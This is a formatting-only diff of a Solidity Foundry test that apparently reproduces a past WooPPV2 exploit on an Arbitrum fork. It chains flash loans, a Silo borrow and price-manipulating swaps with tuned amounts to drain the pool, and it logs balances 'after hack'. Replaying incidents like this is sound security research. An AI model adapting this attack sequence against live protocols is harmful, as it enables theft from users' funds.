@@ -34,34 +34,29 @@ interface ILBFlashLoanCallback {
     ) external returns (bytes32);
 }
 
-interface ISilo{
+interface ISilo {
     function deposit(
-        address _asset, 
-        uint256 _amount, 
+        address _asset,
+        uint256 _amount,
         bool _collateralOnly
     ) external returns (uint256 collateralAmount, uint256 collateralShare);
 
-    function liquidity(address _asset) external view returns (uint256);
+    function liquidity(
+        address _asset
+    ) external view returns (uint256);
 
-    function borrow(
-        address _asset, 
-        uint256 _amount
-    ) external returns (uint256 debtAmount, uint256 debtShare);
+    function borrow(address _asset, uint256 _amount) external returns (uint256 debtAmount, uint256 debtShare);
 
-    function repay(
-        address _asset, 
-        uint256 _amount
-    ) external returns (uint256 repaidAmount, uint256 burnedShare);
+    function repay(address _asset, uint256 _amount) external returns (uint256 repaidAmount, uint256 burnedShare);
 
     function withdraw(
-        address _asset, 
-        uint256 _amount, 
+        address _asset,
+        uint256 _amount,
         bool _collateralOnly
     ) external returns (uint256 withdrawnAmount, uint256 withdrawnShare);
-
 }
 
-interface IWooPPV2{
+interface IWooPPV2 {
     function swap(
         address fromToken,
         address toToken,
@@ -71,7 +66,9 @@ interface IWooPPV2{
         address rebateTo
     ) external returns (uint256 realToAmount);
 
-    function poolSize(address token) external view returns (uint256);
+    function poolSize(
+        address token
+    ) external view returns (uint256);
 }
 
 interface IWooracleV2 {
@@ -82,7 +79,9 @@ interface IWooracleV2 {
         bool woFeasible;
     }
 
-    function state(address base) external view returns (State memory);
+    function state(
+        address base
+    ) external view returns (State memory);
 }
 
 contract ContractTest is Test {
@@ -96,14 +95,14 @@ contract ContractTest is Test {
 
     address public constant LBT = address(0xB87495219C432fc85161e4283DfF131692A528BD); // woo/weth
 
-    address public constant WooracleV2 = address(0x73504eaCB100c7576146618DC306c97454CB3620); 
+    address public constant WooracleV2 = address(0x73504eaCB100c7576146618DC306c97454CB3620);
 
     uint256 public woo_lbt_amount;
 
     uint256 public uni_flash_amount;
 
     function setUp() public {
-        vm.createSelectFork("arbitrum", 187381784);
+        vm.createSelectFork("arbitrum", 187_381_784);
         vm.label(address(USDCe), "USDCe");
         vm.label(address(WETH), "WETH");
         vm.label(address(WOO), "WOO");
@@ -122,17 +121,11 @@ contract ContractTest is Test {
         USDCe.approve(Silo, type(uint256).max);
 
         uni_flash_amount = USDCe.balanceOf(Univ3pool) - 10_000_000_000;
-        IUniswapV3Flash(Univ3pool).flash(
-            address(this),
-            0,
-            uni_flash_amount,
-            new bytes(1)
-        );
+        IUniswapV3Flash(Univ3pool).flash(address(this), 0, uni_flash_amount, new bytes(1));
 
         console.log("USDCe after hack: %s", USDCe.balanceOf(address(this)));
         console.log("WOO after hack: %s", WOO.balanceOf(address(this)));
         console.log("WETH after hack: %s", WETH.balanceOf(address(this)));
-
     }
 
     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
@@ -141,8 +134,8 @@ contract ContractTest is Test {
         woo_lbt_amount = WOO.balanceOf(LBT) - 100;
 
         ILBTFlashloan(LBT).flashLoan(
-            ILBFlashLoanCallback(address(this)), 
-            bytes32(woo_lbt_amount), 
+            ILBFlashLoanCallback(address(this)),
+            bytes32(woo_lbt_amount),
             abi.encodePacked(bytes32(woo_lbt_amount), bytes32(0))
         );
 
@@ -156,38 +149,36 @@ contract ContractTest is Test {
         bytes32 amounts,
         bytes32 totalFees,
         bytes calldata data
-    ) external returns (bytes32){
+    ) external returns (bytes32) {
         uint256 totalFees_ = uint256(totalFees);
-        uint256 usdc_deposit_amount = 7000000000000;
+        uint256 usdc_deposit_amount = 7_000_000_000_000;
         ISilo(Silo).deposit(address(USDCe), usdc_deposit_amount, true);
         uint256 woo_liquidity_amount = ISilo(Silo).liquidity(address(WOO));
         ISilo(Silo).borrow(address(WOO), woo_liquidity_amount);
-        USDCe.transfer(WooPPV2, 2000000000000);
-        IWooPPV2(WooPPV2).swap( address(USDCe), address(WETH), 2000000000000, 0, address(this), address(this));
+        USDCe.transfer(WooPPV2, 2_000_000_000_000);
+        IWooPPV2(WooPPV2).swap(address(USDCe), address(WETH), 2_000_000_000_000, 0, address(this), address(this));
         IWooracleV2(WooracleV2).state(address(WOO));
-        USDCe.transfer(WooPPV2, 100000000000);
-        IWooPPV2(WooPPV2).swap( address(USDCe),address(WOO), 100000000000, 0, address(this), address(this));
+        USDCe.transfer(WooPPV2, 100_000_000_000);
+        IWooPPV2(WooPPV2).swap(address(USDCe), address(WOO), 100_000_000_000, 0, address(this), address(this));
         IWooracleV2(WooracleV2).state(address(WOO));
-        // uint256 woo_amount_after = WOO.balanceOf(address(this)); 
-        uint256 woo_amount_swap = 7856868800000000000000000; //@note adjusted value, otherwise overflow in price calculation
+        // uint256 woo_amount_after = WOO.balanceOf(address(this));
+        uint256 woo_amount_swap = 7_856_868_800_000_000_000_000_000; //@note adjusted value, otherwise overflow in price calculation
         WOO.transfer(WooPPV2, woo_amount_swap);
-        IWooPPV2(WooPPV2).swap(  address(WOO), address(USDCe), woo_amount_swap, 0, address(this), address(this));
-        IWooracleV2(WooracleV2).state(address(WOO)); 
+        IWooPPV2(WooPPV2).swap(address(WOO), address(USDCe), woo_amount_swap, 0, address(this), address(this));
+        IWooracleV2(WooracleV2).state(address(WOO));
         IWooPPV2(WooPPV2).poolSize(address(WOO));
-        
+
         USDCe.balanceOf(address(this));
-        uint256 usdc_amount_drain = 926342; //@note another ajusted value to reflect the pool size
+        uint256 usdc_amount_drain = 926_342; //@note another ajusted value to reflect the pool size
 
         USDCe.transfer(WooPPV2, usdc_amount_drain);
-        IWooPPV2(WooPPV2).swap( address(USDCe),address(WOO), usdc_amount_drain, 0, address(this), address(this));
+        IWooPPV2(WooPPV2).swap(address(USDCe), address(WOO), usdc_amount_drain, 0, address(this), address(this));
 
         ISilo(Silo).repay(address(WOO), type(uint256).max);
         ISilo(Silo).withdraw(address(USDCe), type(uint256).max, true);
-        WOO.transfer(LBT, woo_lbt_amount + totalFees_ +10000);
+        WOO.transfer(LBT, woo_lbt_amount + totalFees_ + 10_000);
         return keccak256("LBPair.onFlashLoan");
     }
- 
 
     receive() external payable {}
 }
-
